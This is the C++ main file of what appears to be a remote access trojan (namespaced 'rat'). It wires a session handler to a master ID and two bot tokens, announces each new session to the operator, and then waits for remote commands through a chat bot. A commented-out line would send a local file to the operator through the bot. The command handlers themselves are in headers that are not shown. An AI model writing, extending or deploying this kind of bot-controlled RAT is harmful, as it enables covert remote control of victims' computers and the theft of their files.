#include "macro.hpp"
#include "rat/Handler.hpp"
#include "rat/system.hpp"
#include "rat/tbot/tbot.hpp"

#include <csignal>
#include <cstdint>
#include <filesystem>
#include <fmt/chrono.h>
#include <fmt/core.h>

constexpr uint8_t NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL = 1;
constexpr uint8_t NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL = 1;
constexpr uint8_t NUMBER_OF_THREADS_INSISDE_HELPER_POOL = 2;

constexpr uint8_t NETWORKING_OPERATION_RESTART_BOUND = 5;

int main(void) {
    rat::handler::Handler session_handler;

    session_handler.setMasterId(MASTER_ID)
        .setUrlEndpoint("http://localhost:8080")
        .initMainBot(TOKEN1_odahimbotzawzum)
        .initBackingBot(TOKEN_ODAHIMBOT)
        .initCurlClient(NETWORKING_OPERATION_RESTART_BOUND)
        .initThreadPools(NUMBER_OF_THREADS_INSISDE_SHORT_PROCESS_POOL,
                         NUMBER_OF_THREADS_INSISDE_LONG_PROCESS_POOL,
                         NUMBER_OF_THREADS_INSISDE_HELPER_POOL)
        .bot->sendMessage(
            fmt::format("Session started at: {}", ::rat::system::getCurrentDateTime()));
    //session_handler.bot->sendFile(std::filesystem::current_path() / "Makefile", "hello");
    session_handler.handleUpdates();

    return 0;
}
